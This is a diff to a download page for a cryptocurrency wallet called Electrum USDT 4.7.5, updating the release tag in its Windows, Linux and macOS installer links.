@@ -29,15 +29,15 @@ Choose your operating system to download Electrum USDT 4.7.5:
 
 ### 🪟 Windows
 
-[Download for Windows](https://github.com/Electrum-Tether/electrum-usdt/releases/download/v.4.7.5/electrum-usdt-4.7.5-Windows-setup.exe)
+[Download for Windows](https://github.com/Electrum-Tether/electrum-usdt/releases/download/v.4.7.5.0/electrum-usdt-4.7.5-Windows-setup.exe)
 
 ### 🐧 Linux
 
-[Download for Linux](https://github.com/Electrum-Tether/electrum-usdt/releases/download/v.4.7.5/electrum-usdt-4.7.5-Linux.AppImage)
+[Download for Linux](https://github.com/Electrum-Tether/electrum-usdt/releases/download/v.4.7.5.0/electrum-usdt-4.7.5-Linux.AppImage)
 
 ### 🍎 macOS
 
-[Download for macOS](https://github.com/Electrum-Tether/electrum-usdt/releases/download/v.4.7.5/electrum-usdt-4.7.5-MacOS.dmg)
+[Download for macOS](https://github.com/Electrum-Tether/electrum-usdt/releases/download/v.4.7.5.0/electrum-usdt-4.7.5-macOS.dmg)
 
 ---
 
